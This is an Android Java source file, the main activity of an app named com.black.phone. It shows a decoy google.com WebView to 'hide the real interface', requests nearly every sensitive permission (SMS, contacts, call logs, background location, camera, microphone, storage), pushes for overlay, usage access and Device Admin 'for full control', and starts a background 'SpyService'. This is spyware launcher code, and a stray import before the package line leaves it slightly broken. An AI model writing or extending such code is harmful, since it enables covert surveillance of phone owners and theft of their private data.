import android.content.ComponentName;
package com.black.phone;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_PERMISSIONS = 100;
    private static final int REQUEST_ADMIN = 101;
    private static final int REQUEST_OVERLAY = 102;
    private static final int REQUEST_USAGE = 103;
    private Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        context = this;
        
        // Hide the real interface with WebView (optional)
        setupWebView();
        
        // Request all permissions
        requestAllPermissions();
        
        // Request Device Admin
        requestDeviceAdmin();
        
        // Start SpyService
        startSpyService();
    }
    
    private void setupWebView() {
        WebView webView = findViewById(R.id.webView);
        if (webView != null) {
            webView.setWebViewClient(new WebViewClient());
            webView.loadUrl("https://www.google.com");
            webView.getSettings().setJavaScriptEnabled(true);
        }
    }
    
    private void requestAllPermissions() {
        String[] permissions = {
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.WRITE_CALL_LOG,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.MANAGE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.READ_PHONE_NUMBERS,
            android.Manifest.permission.INTERNET,
            android.Manifest.permission.ACCESS_WIFI_STATE,
            android.Manifest.permission.CHANGE_WIFI_STATE,
            android.Manifest.permission.BLUETOOTH,
            android.Manifest.permission.BLUETOOTH_ADMIN,
            android.Manifest.permission.BLUETOOTH_CONNECT,
            android.Manifest.permission.SYSTEM_ALERT_WINDOW,
            android.Manifest.permission.FOREGROUND_SERVICE,
            android.Manifest.permission.WAKE_LOCK,
            android.Manifest.permission.VIBRATE,
            android.Manifest.permission.READ_LOGS,
            android.Manifest.permission.PACKAGE_USAGE_STATS,
            android.Manifest.permission.QUERY_ALL_PACKAGES
        };
        
        List<String> list = new ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                list.add(perm);
            }
        }
        
        if (!list.isEmpty()) {
            ActivityCompat.requestPermissions(this, list.toArray(new String[0]), REQUEST_PERMISSIONS);
        } else {
            Toast.makeText(this, "✅ All permissions granted", Toast.LENGTH_SHORT).show();
        }
        
        // Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, REQUEST_OVERLAY);
        }
        
        // Usage access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            startActivityForResult(intent, REQUEST_USAGE);
        }
    }
    
    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, DeviceAdmin.class);
        if (!dpm.isAdminActive(admin)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "Device Admin required for full control");
            startActivityForResult(intent, REQUEST_ADMIN);
        } else {
            Toast.makeText(this, "✅ Device Admin active", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void startSpyService() {
        Intent serviceIntent = new Intent(this, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        Toast.makeText(this, "🕵️ Service running in background", Toast.LENGTH_SHORT).show();
    }
}
